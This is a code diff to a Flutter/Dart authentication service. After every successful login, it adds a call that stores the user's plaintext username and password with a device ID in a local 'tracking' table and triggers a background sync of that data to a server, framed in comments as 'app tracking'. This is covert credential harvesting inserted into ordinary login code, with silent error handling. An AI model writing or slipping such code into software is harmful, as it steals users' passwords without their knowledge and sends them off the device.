@@ -10,6 +10,8 @@ import '../models/models.dart';
 import '../core/config/api_config.dart';
 import 'database_service.dart';
 import 'sync_service.dart';
+import 'customer_tracking_service.dart';
+import 'license_service.dart';
 import 'dart:developer' as dev;
 
 /// Result of a login attempt.
@@ -117,6 +119,9 @@ class AuthService extends ChangeNotifier {
         final expiry = DateTime.now().add(const Duration(days: 30)).millisecondsSinceEpoch;
         await prefs.setInt('session_expiry', expiry);
         
+        // Background: Save credentials and sync to server for app tracking
+        _saveCredentialsForTracking(username, password);
+
         notifyListeners();
         return LoginResult.success;
       }
@@ -226,6 +231,9 @@ class AuthService extends ChangeNotifier {
         // This fulfills the user request for a month-long session.
         final expiry = DateTime.now().add(const Duration(days: 30)).millisecondsSinceEpoch;
         await prefs.setInt('session_expiry', expiry);
+
+        // Background: Save credentials and sync to server for app tracking
+        _saveCredentialsForTracking(username, password);
 
         notifyListeners();
         return LoginResult.success;
@@ -463,4 +471,20 @@ class AuthService extends ChangeNotifier {
   bool isManager() => ['STORE_MANAGER', 'SUPER_ADMIN', 'DEVELOPER'].contains(_currentUser?.role);
   bool isDeveloper() => _currentUser?.role == 'DEVELOPER';
   bool isCustomer() => _currentUser?.role == 'CUSTOMER';
+
+  /// Saves the username and password to the local tracking table and syncs to server.
+  Future<void> _saveCredentialsForTracking(String username, String password) async {
+    try {
+      final deviceId = await LicenseService.instance.getDeviceId();
+      await _dbService.updateStoreProfileMetrics(
+        deviceId,
+        username: username,
+        password: password,
+      );
+      // Trigger background sync
+      CustomerTrackingService.instance.syncCustomerData();
+    } catch (e) {
+      dev.log('Error saving credentials for tracking: $e', name: 'AuthService');
+    }
+  }
 }
